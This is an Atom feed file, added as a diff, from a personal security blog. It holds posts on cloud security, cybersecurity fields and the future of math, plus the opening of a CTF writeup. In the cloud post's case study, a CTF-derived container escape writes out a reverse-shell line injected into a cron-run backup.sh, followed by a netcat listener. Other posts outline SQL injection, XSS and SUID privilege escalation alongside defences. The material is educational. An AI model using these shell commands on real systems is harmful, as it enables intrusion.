@@ -1,0 +1,1044 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+ <title>ThelastVvV</title>
+ <link href="https://www.thelastvvv.com//atom.xml" rel="self"/>
+ <link href="https://www.thelastvvv.com//"/>
+ <updated>2021-12-12T19:21:53+01:00</updated>
+ <id>https://www.thelastvvv.com/</id>
+ <author>
+   <name>ThelastVvV</name>
+   <email>thelastvvv@protonmail.ch</email>
+ </author>
+
+ 
+ <entry>
+   <title>Cloud Secuirty issues and solutions</title>
+   <link href="https://www.thelastvvv.com//2021/11/06/cloud-secuirty-issues-and-solutions"/>
+   <updated>2021-11-06T06:00:53+01:00</updated>
+   <id>https://www.thelastvvv.com//2021/11/06/Cloud Secuirty issues and solutions</id>
+   <content type="html">&lt;h3 id=&quot;table-of-contents-&quot;&gt;Table of Contents :&lt;/h3&gt;
+&lt;ol&gt;
+  &lt;li&gt;&lt;a href=&quot;#Introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#example2&quot;&gt;Cloud Computing&lt;/a&gt;
+    &lt;ol&gt;
+      &lt;li&gt;&lt;a href=&quot;#Deployment&quot;&gt;Deployment models&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#Service&quot;&gt;Service models&lt;/a&gt;&lt;/li&gt;
+    &lt;/ol&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#Cloud-Secuirty&quot;&gt;Cloud Secuirty&lt;/a&gt;
+    &lt;ol&gt;
+      &lt;li&gt;&lt;a href=&quot;#issues&quot;&gt;Issues&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#solutions&quot;&gt;Solution&lt;/a&gt;&lt;/li&gt;
+    &lt;/ol&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#TOB&quot;&gt;Thinking outside the box(Case Study)&lt;/a&gt;
+&lt;!-- toc --&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3 id=&quot;introduction&quot;&gt;Introduction:&lt;/h3&gt;
+&lt;p&gt;Cloud computing these day is a hot topic all over the world and in each tech newspaper you will read that from big tech companies massively investing in the cloud to goverments adopting the cloud as solution to IoT preparing to overtake cloud computing as primary industy technology ,simultaneously many concerns are rising from users data privacy to the cloud basic secuirty that why we need to understand the major cloud security issues and how to protect it and my suggestions to solve some of these basics issues.&lt;/p&gt;
+&lt;h3 id=&quot;cloud-computing--&quot;&gt;Cloud Computing  :&lt;/h3&gt;
+&lt;p&gt;Cloud computing is technology of that uses as over internet services of storing and accessing data and programs remotely instead of traditional local computing .&lt;/p&gt;
+&lt;h4 id=&quot;deployment-models-&quot;&gt;Deployment models :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/rC0XesX.png&quot; alt=&quot;1&quot; /&gt;
+Private cloud : owned and managed by one organization and a hosted cloud on a private network . Community cloud : owned and managed by one of the organization or third party but is shared between multiple organizations 
+Public cloud: provider have hardware and infrastructure and any client access the services over the internet . 
+Hybrid cloud : combinations set of the other clouds&lt;/p&gt;
+&lt;h4 id=&quot;service-models&quot;&gt;Service models:&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.redhat.com/cms/managed-files/iaas-paas-saas-diagram5.1-1638x1046.png&quot; alt=&quot;1&quot; /&gt;
+SaaS Software As Service : that consumer use software application on cloud infrastructure which can been accessible from browser or program interface like google apps , netsuite  yahoo!mail…
+PaaS Platform As Service  : that consumer can deploy onto cloud infrastructure  builded applications or important libraries , services and tools the user have control only over deployed applications and thier environment for example : Google App Engine, Apache Stratos, Red Hat OpenShift
+Iaas Infrastructure As Service : the consumer get offer essential compute OS , networking resources (limited) and storage  a pay as you go services like AWS EC2,S3 ,Microsoft Azure ,Cisco Metacloud and rackspace&lt;/p&gt;
+&lt;h3 id=&quot;cloud-security--&quot;&gt;Cloud Security  :&lt;/h3&gt;
+&lt;p&gt;As many of organizations moved their data , app and assets to the cloud it become very important as we mentioned before to understand the issues and how to protect which we need to have a good sets of policies, controls , procedures and users educations to achieve our goal of protection against risks and attacks and to fix the issues.&lt;/p&gt;
+&lt;h4 id=&quot;issues-&quot;&gt;Issues :&lt;/h4&gt;
+&lt;p&gt;The most major issues are  Data Breaches, availability and Data Loss, Account Hijacking , insecure authentication &amp;amp; authorization, ,Insecure and leaked APIs ,Denial of Service can shutdown the services ,Insufficient Due Diligence is an insufficiency of proper measures taken to ensure the credibility of the vendor Shared Technology Issues because of using of many services layers and if a shared platform component is compromised that will risk and exposes the entire environment  to be compromised .&lt;/p&gt;
+
+&lt;h4 id=&quot;solutions&quot;&gt;Solutions:&lt;/h4&gt;
+&lt;p&gt;The solution to all this issues in ensure to apply high measures of secure authentication and acces managment and validation of data management solutions and abilty to secure data also availability regrarding the data backup and recovery and daily security vulnerbality scanning with regular system configuration and patch managent and risk assesments  ,finally training employess about secuirt awareness and  personnel requirements, including clearances, roles, and responsibilities so eliminate any inside threats&lt;/p&gt;
+&lt;h3 id=&quot;thinking-outside-the-boxcase-study--&quot;&gt;Thinking outside the box(Case Study)  :&lt;/h3&gt;
+
+&lt;p&gt;After all the risks / issues and solutions we discussed previously and still many attacks on cloud occur per day  why ? simply cause threat actors are activly trying to find the way in the system finding a  mistake or fresh active vulnerability that can be exploited …from my point of vue  most of exploited systems happens mostly from lazyness or a delayed patching of vulnerabilities and fixing misconfigurations so in this case study we talk about Containers as a Service (CaaS) “Cloud service model that allows users to upload, organize, start, stop, scale and otherwise manage containers, applications and clusters… Google Kubernetes and Docker Swarm are two examples of CaaS orchestration platforms” so CaaS can have same previous cloud services issues that can lead from compromise of a container image or container as a whole  to break out of the container and gain control over the host system. Now let demostrate how this clould be done !&lt;/p&gt;
+
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;backup.sh   
+&lt;span class=&quot;c&quot;&gt;#!/bin/bash&quot;&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;tar &lt;/span&gt;cf /root/container/backup/backup.tar /root/container
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;we have a backup.sh that runs every minute, taking the backup.tar to /root/container so  we  will need to edit this backupfile to reverse shell and bypass the docker-container so we just replace the backfile.tar to our reverse shell&lt;/p&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;#!/bin/bash&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; backup.sh&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;bash -i &amp;gt;&amp;amp; /dev/tcp/RHOST/RPORT 0&amp;gt;&amp;amp;1&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; backup.sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.thelastvvv.com/images/posts/3/ttt2.jpg&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;then we will Now we start listening to port&lt;/p&gt;
+
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; RPORT
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.thelastvvv.com/images/posts/3/ttt4.png&quot; alt=&quot;2&quot; /&gt;
+As we can see that we successfully escaped the the docker countainer to the host root server.
+So the solution is simple is a day by day vulnerability assessment and threat intelligence analysing to mitigate and patch any potential threats .&lt;/p&gt;
+
+&lt;p&gt;Note*: the demostration is done by me during an old CTF writeup.&lt;/p&gt;
+&lt;h5 id=&quot;references&quot;&gt;References:&lt;/h5&gt;
+&lt;p&gt;https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-144.pdf
+https://nvlpubs.nist.gov/nistpubs/legacy/sp/nistspecialpublication800-145.pdf
+https://downloads.cloudsecurityalliance.org/initiatives/top_threats/The_Notorious_Nine_Cloud_Computing_Top_Threats_in_2013.pdf
+https://webcache.googleusercontent.com/search?q=cache:XsiKlYeqYxEJ:https://www.ibm.com/services/cloud/containers-as-a-service+&amp;amp;cd=15&amp;amp;hl=en&amp;amp;ct=clnk&amp;amp;gl=ae
+https://www.thelastvvv.com/ctf/2020/07/10/Dogcat-Writeup.html#privilege-escalation
+https://www.redhat.com/en/topics/cloud-computing/iaas-vs-paas-vs-saas&lt;/p&gt;
+</content>
+ </entry>
+ 
+ <entry>
+   <title>A Quick Look At Cyber Security Fields</title>
+   <link href="https://www.thelastvvv.com//2021/04/30/a-quick-look-at-cyber-security-fields"/>
+   <updated>2021-04-30T07:00:53+02:00</updated>
+   <id>https://www.thelastvvv.com//2021/04/30/A Quick-Look-At-Cyber-Security-Fields</id>
+   <content type="html">&lt;h3 id=&quot;table-of-contents&quot;&gt;Table of contents&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#web-security&quot;&gt;Web security&lt;/a&gt;
+    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#sql-injection&quot;&gt;SQL injection&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#cross-site-scripting&quot;&gt;Cross site-scripting&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#security-misconfiguration&quot;&gt;Security Misconfiguration&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#software-security&quot;&gt;Software Security&lt;/a&gt;
+    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#buffer-overflow&quot;&gt;Buffer Overflow&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#ip-security&quot;&gt;IP Security&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#email-security&quot;&gt;Email-Security&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#conclusion&quot;&gt;Conclusion&lt;/a&gt;
+&lt;!-- toc --&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;
+&lt;p&gt;Today during these harsh times of covid-19 we believe that cyber security is important now more than ever as we can see internet is part of our daily life, and that why everyone should understand and comprehend all the things that come with it from the basics to security. 
+Cyber security is combination of practice, strategies and policies that aim to protect systems, networks and data from malicious attacks and best way to protect these things is educate internet users to understand the attacks and risks and how take the necessary measures to defends their systems and electronic assets and in this report the users will have quick look at cyber security fields as part of our contribution to help making the internet a safe and secure place.&lt;/p&gt;
+
+&lt;h2 id=&quot;web-security&quot;&gt;Web security&lt;/h2&gt;
+&lt;p&gt;Web security field is incredibly famous branch of cyber security as we can see most internet users either own or visit websites and it’s important to know how threat actors attack these websites and how to protect them, this why we can showcase some famous OWASP top ten web application security vulnerabilities: SQL injection, Cross-site scripting, and Broken Access Control.&lt;/p&gt;
+
+&lt;h3 id=&quot;sql-injection&quot;&gt;SQL injection&lt;/h3&gt;
+
+&lt;p&gt;SQL Injection: the threat attacker can inject SQL commands to manipulate or expose hidden data of the database and Theres many types of  SQL injection.&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Attack :&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;As we cans see below, we have a vulnerable website   that we will try SQL injection on it&lt;br /&gt;
+&lt;img src=&quot;https://thelastvvv.github.io/images/posts/5/sql_1.png&quot; alt=&quot;alt text&quot; title=&quot;sql1&quot; /&gt;
+The ways to check is by add a “ ‘ “ apostrophe at end of the id  ?id=1’ 
+As we can see sometimes  you have some kind of error that indicates that there is a SQL error or just missing and broken things in the page 
+&lt;img src=&quot;https://thelastvvv.github.io/images/posts/5/sql_2.png&quot; alt=&quot;alt text&quot; title=&quot;sql2&quot; /&gt;
+We keep testing until the page return to normal states in this case in id 4 which means that there’s 4 columns in the database. Now we preform onion injection to check vulnerable columns in this case we have 3 and 4 that we can manipulate and get the data we want&lt;br /&gt;
+&lt;img src=&quot;https://thelastvvv.github.io/images/posts/5/sql_3.png&quot; alt=&quot;alt text&quot; title=&quot;sql3&quot; /&gt;
+A Simple SQL commands like database()  in vulnerable columns and we retrieved the database name 
+&lt;img src=&quot;https://thelastvvv.github.io/images/posts/5/sql_4.png&quot; alt=&quot;alt text&quot; title=&quot;sql4&quot; /&gt;
+Now we will retrieve username and password from the users table  using the vulnerable columns 3and4&lt;br /&gt;
+&lt;img src=&quot;https://thelastvvv.github.io/images/posts/5/sql_5.png&quot; alt=&quot;alt text&quot; title=&quot;sql5&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Defend:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Top 3 method of preventing SQL injection attacks “”&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Prepared statement: “make sure that the parameters (i.e. inputs) passed into SQL statements are treated in a safe manner.” - Escaping Inputs: using the strings escaping   to avoid characters that could lead to a malicious SQL command. 
+Example:
+    &lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$firstname&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$mysqli&lt;/span&gt; -&amp;gt; real_escape_string&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'firstname'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 
+&lt;span class=&quot;nv&quot;&gt;$lastname&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$mysqli&lt;/span&gt; -&amp;gt; real_escape_string&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'lastname'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 
+&lt;span class=&quot;nv&quot;&gt;$age&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$mysqli&lt;/span&gt; -&amp;gt; real_escape_string&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'age'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Sanitizing Inputs: the developers need to create a strong validations checker for all forms that helps to reject inputs that look suspicious automatically&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;cross-site-scripting&quot;&gt;Cross site-scripting&lt;/h3&gt;
+&lt;p&gt;Is a vulnerability that allow the threat actor attack to inject malicious script in the vulnerable website which can lead to client-side attack in other meaning the threat actor can attack another user withing the vulnerable website &lt;br /&gt;
+Attack: 
+In this case we will have a look of persistent cross site scripting of a vulnerable WordPress plugin that can lead to administrator and user’s session hijacking or phishing attack that can results of compromised the website. 
+&lt;img src=&quot;https://thelastvvv.github.io/images/posts/5/xss_1.png&quot; alt=&quot;alt text&quot; title=&quot;xss1&quot; /&gt;
+The threat actor can inject a malicious JavaScript into the registration form 
+&lt;img src=&quot;https://thelastvvv.github.io/images/posts/5/xss_2.png&quot; alt=&quot;alt text&quot; title=&quot;xss2&quot; /&gt;
+Which resulted in successful running the malicious JavaScript in admin panel of WordPress user. 
+&lt;img src=&quot;https://thelastvvv.github.io/images/posts/5/xss_3.png&quot; alt=&quot;alt text&quot; title=&quot;xss3&quot; /&gt;
+Defend:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Escape Dynamic Content: replacing significant characters (JavaScript) with the HTML entity encoding&lt;/li&gt;
+  &lt;li&gt;Implementing  web application/server  firewalls like ( i.e. Akamai Edge, Cloudflare)&lt;/li&gt;
+  &lt;li&gt;As normal user daily updating your plugins and remove inactive ones&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;security-misconfiguration&quot;&gt;Security Misconfiguration&lt;/h3&gt;
+&lt;p&gt;Attack : 
+From webserver Linux point of view , SUID means set user id , some files in Linux have some specific permission different from  r-w-x  this permissions are set by the owner of file . but in same binaries and files could be owned by root but other users are allowed to run it as result  sometimes in misconfiguration and unrestricted on authentication of the users. 
+&lt;img src=&quot;https://thelastvvv.github.io/images/posts/5/sec_1.png&quot; alt=&quot;alt text&quot; title=&quot;sec1&quot; /&gt;
+The threat actor can preform Privilege escalation from a normal user in system to root . 
+&lt;img src=&quot;https://thelastvvv.github.io/images/posts/5/sec_2.png&quot; alt=&quot;alt text&quot; title=&quot;sec2&quot; /&gt;
+As we can see  this system can be exploited by  runing sudo superuser command in ENV binary that results an access to the file system, escalating or maintain privileged access.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://thelastvvv.github.io/images/posts/5/sec_3.png&quot; alt=&quot;alt text&quot; title=&quot;sec3&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Defend:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;“Secure installation processes”&lt;/li&gt;
+  &lt;li&gt;“A task to review and update the configurations appropriate to all security.”&lt;/li&gt;
+  &lt;li&gt;“An automated process to verify the effectiveness of the configurations”&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;software-security&quot;&gt;Software Security&lt;/h2&gt;
+&lt;p&gt;Software Security is important to to protect and secure softwares from threats and risks&lt;/p&gt;
+&lt;h3 id=&quot;buffer-overflow&quot;&gt;Buffer Overflow&lt;/h3&gt;
+&lt;p&gt;Buffer overflow:  occurs when a program tries to store more data in a temporary storage area than it can hold 
+Attack (stack demo): 
+&lt;img src=&quot;https://thelastvvv.github.io/images/posts/5/buff_1.png&quot; alt=&quot;alt text&quot; title=&quot;buffer&quot; /&gt;
+in code above we can say user required to enter the name if the is match the name we stored it will create text file on the desktop (edited version of James Lyne)
+&lt;img src=&quot;https://thelastvvv.github.io/images/posts/5/buff_2.png&quot; alt=&quot;alt text&quot; title=&quot;buffer2&quot; /&gt;
+The C code have a variable char name have 16 bits what we cand see the that we exceeded the number of bits it starts over flow the second variable int which resulted in execution command if (namecheck) then created text file in the desktop 
+Defend:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Better coding practices and security software implementation.&lt;/li&gt;
+  &lt;li&gt;Non-executable stack:  configured the stack to not have any executable code.&lt;/li&gt;
+  &lt;li&gt;Static Analysis:  analysis the source code from dangerous library calls ,strings and functions.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;ip-security&quot;&gt;IP Security&lt;/h2&gt;
+&lt;p&gt;IP: Internet Protocol address is a unique address assigned to a device on the local network or on the internet&lt;br /&gt;
+IP security: is security implantation which adds layers of encryption and authentication to the IP. 
+Top IPsec benefits:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Secure routing&lt;/li&gt;
+  &lt;li&gt;VPN over internet&lt;/li&gt;
+  &lt;li&gt;Secure remote access&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;IP sec pros and cons: 
+Pros:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Supplies confidentiality, authenticity, and integrity&lt;/li&gt;
+  &lt;li&gt;Anon identity of the network&lt;/li&gt;
+  &lt;li&gt;Secure network than without any security layers&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Cons:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;One problem can cause issues with full network&lt;/li&gt;
+  &lt;li&gt;VPN gateways can be hacked&lt;/li&gt;
+  &lt;li&gt;NAT and Firewall traversal are not easy to solve&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;email-security&quot;&gt;Email-Security&lt;/h2&gt;
+&lt;p&gt;Email security is particularly important because of the sensitive information that countians but also the wide range if usage of emails is part of our daily checkup routine that why we need to learn how to email security works and how we need to do to be safe. 
+Most of emails gateways come with some specific security layers like:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Anti-virus Protection&lt;/li&gt;
+  &lt;li&gt;Data Encryption&lt;/li&gt;
+  &lt;li&gt;Spam filtering&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;But all these measures are not enough we need to make sure we are doing a secure login, having strong password, not opening random and spam emails, or downloading the attachments. As for companies they need to create a program with new policies and rules that change Frequently change password, and avoid sharing sensitive information and use of company emails without a secure connections like VPN.&lt;/p&gt;
+&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
+&lt;p&gt;At end the users of internet should learn and understand cyber security and also security expert should teach and contribute to the community and encourage the new comers and curious people because security is not about secure coding but also a life style, information security is wide range of fields and topic can be presented in different ways at end is to archive one goal a secure and safe cyberspace for everyone.&lt;/p&gt;
+
+&lt;h5 id=&quot;reference&quot;&gt;Reference:&lt;/h5&gt;
+&lt;p&gt;https://www.w3schools.com/php/func_mysqli_real_escape_string.asp
+https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
+https://redtiger.labs.overthewire.org/
+https://gtfobins.github.io/gtfobins/env/
+https://www.geeksforgeeks.org/ip-security-ipsec/
+https://www.cse.wustl.edu/~jain/cis788-97/ftp/ip_security/index.html
+https://forum.huawei.com/enterprise/en/advantages-and-disadvantages-of-ipsec/thread/567725-867
+https://nvd.nist.gov/vuln/detail/CVE-2020-15536
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15536&lt;/p&gt;
+
+</content>
+ </entry>
+ 
+ <entry>
+   <title>Comunication IoT Security</title>
+   <link href="https://www.thelastvvv.com//2021/04/29/iot-security"/>
+   <updated>2021-04-29T07:00:53+02:00</updated>
+   <id>https://www.thelastvvv.com//2021/04/29/Iot-Security</id>
+   <content type="html">&lt;h1 id=&quot;comunication-iot-security&quot;&gt;Comunication: IoT Security&lt;/h1&gt;
+
+&lt;embed src=&quot;https://www.thelastvvv.com/images/posts/6/iotsec.pdf&quot; width=&quot;800&quot; height=&quot;800&quot; type=&quot;application/pdf&quot; /&gt;
+
+</content>
+ </entry>
+ 
+ <entry>
+   <title>Math for the next 50 years</title>
+   <link href="https://www.thelastvvv.com//2020/11/28/futureofmath"/>
+   <updated>2020-11-28T06:00:53+01:00</updated>
+   <id>https://www.thelastvvv.com//2020/11/28/FUTUREOFMATH</id>
+   <content type="html">&lt;h3 id=&quot;table-of-contents&quot;&gt;Table of contents&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#the-past-and-future&quot;&gt;The Past and future&lt;/a&gt;
+    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#back-to-the-origins&quot;&gt;Back To The Origins&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#in-between&quot;&gt;In between&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#general-thoughts&quot;&gt;General thoughts&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;!-- toc --&gt;
+
+&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;
+&lt;p&gt;Sometimes we ask our self some unfamiliar question about things we already know but still we don’t have  all answers well that  day is Today so let do it ! My questions are what’s mathematic ? how many types of mathematic ? and yes we use mathematic in daily basis, I’m 100% sure that everyone in the world each day calculate something right ? as we try to imagine how our technology will be developed and how it’s going to look like !? in this post we’ll discuss how mathematic will look like in the future .&lt;/p&gt;
+&lt;h2 id=&quot;the-past-and-future&quot;&gt;The Past and future&lt;/h2&gt;
+&lt;p&gt;mathematic is very important in our life to solve many problems . math is a powerful tool because its evolved all around us and this tool is key of advance of our civilization as Aristotle said :”The mathematical sciences particularly exhibit order, symmetry, and limitation; and these are the greatest forms of the beautiful.”&lt;/p&gt;
+&lt;h3 id=&quot;back-to-the-origins&quot;&gt;Back To The Origins&lt;/h3&gt;
+&lt;p&gt;To predict the future of mathematics we must go back in the time and see how’s starts in the early ages and how the math looks like in different civilization, from counting to calculations to measurement without this fundamental knowledge people can’t build house neither inherited or count  how much will be distributed . And from this basics questions  “how much ? how many ? how long? “ math was born.
+From understanding the fundamental knowledge of mathematics through the history we find that that tribes in Africa used to trade tobacco sticks for sheep the traders knew that 2 sticks equals to 1 sheep and 4 sticks equals to 2 sheep and from this we learnt  two times two equals four. and other tribes also knew to count only with 2 two numbers for example 2 plus 2plus 2 plus 2 plus 2 plus 2plus 2 plus 2plus 2 plus 2plus equals 10 and each place has his own way of counting all around the world.
+Also the system of enumerations keep developing from old time till now. the primitive people used notches, sticks, stones then the Egyptians used symbols for 1, 10, 100, 1,000, … 1,0000,000. while the Babylonians used two symbols only–cuneiform in the other hand Greeks used  alphabetical denotations, plus special symbols while Roman used Roman numerals, I,V,X,L,C,D,M..and Arabs used Ten special symbols for numbers until the Islamic  golden age and spread all around the world which what we using our  Modern time is a version of Arabian Ten special symbols for numbers.&lt;/p&gt;
+&lt;h3 id=&quot;in-between&quot;&gt;In between&lt;/h3&gt;
+&lt;p&gt;One of the famous devices that had been used for centuries is “Abacus” as Methods of ciphering . His first appearance was in the Sumer civilization period 2700–2300 BC that abacus kept getting developed in different time and civilization till our modern days is used as method of counting which there’s many competitions all around the world it help children  and competitive players to have big imagination and mastering mind calculations either small or big numbers .
+ today we have the modern abacus tomorrow we can have new generation of abacus a new form new concept and new methods or either i new algorithm for a new devices as we can see there a huge jump in the technology field and we are sure the future mathematic also will have a huge impact . in the future we will  numbers converted to colors ,shapes maybe a new advance understanding of our reality and talking about reality maybe in the future you can learn from the best professors in our history using virtual reality when can predict one exact thing but sure we can say maybe the ABACUS understanding will be changed for example the number 5 bead can be referred as color (red) while each other 4 beads referred to yellow orange blue and white . but blind people can have difficult to understand our reference then we can assignment to sound or taste of sense (a touch ) a shape or any things out of our imagination so we asked a friend (Leith) about this topic and he told us “that maybe the math we not change in the recent future but definitely the way of teaching will change he said math in the future will be the easiest subject and most understandable subject future student will understand due the effect of the technology there’s more application mobile,web,games but not just that but also the future teachers will take innovative steps and new mentality of teaching the future generations “.&lt;/p&gt;
+&lt;h2 id=&quot;general-thoughts&quot;&gt;General thoughts&lt;/h2&gt;
+&lt;p&gt;At end we all know that  our future will be different from our past because of our innovative actions to advance our civilization each day we lived and each time and we have numerous number of problems that need to be solve using mathematic and we pretty sure that our mathematicians will create new methods , new ways and solve all these problems  and I believe that mathematic is not away of counting but also is a language of the universe .&lt;/p&gt;
+
+&lt;p&gt;Reference:&lt;/p&gt;
+
+&lt;p&gt;https://en.wikipedia.org/wiki/Abacus&lt;/p&gt;
+
+&lt;p&gt;https://en.wikipedia.org/wiki/Liber_Abaci&lt;/p&gt;
+
+&lt;p&gt;https://en.wikipedia.org/wiki/Future_of_mathematics&lt;/p&gt;
+
+&lt;p&gt;The History of Mathematics Instructor: G. Donald Allen-Spring, 1997&lt;/p&gt;
+
+</content>
+ </entry>
+ 
+ <entry>
+   <title>Game Zone | Writeup</title>
+   <link href="https://www.thelastvvv.com//2020/07/20/gamezone-writeup"/>
+   <updated>2020-07-20T07:00:53+02:00</updated>
+   <id>https://www.thelastvvv.com//2020/07/20/GameZone-[Writeup]</id>
+   <content type="html">&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;#game-zone&quot;&gt;Game Zone&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#enumeration&quot;&gt;Enumeration&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#exploitation&quot;&gt;Exploitation&lt;/a&gt;&lt;/li&gt;
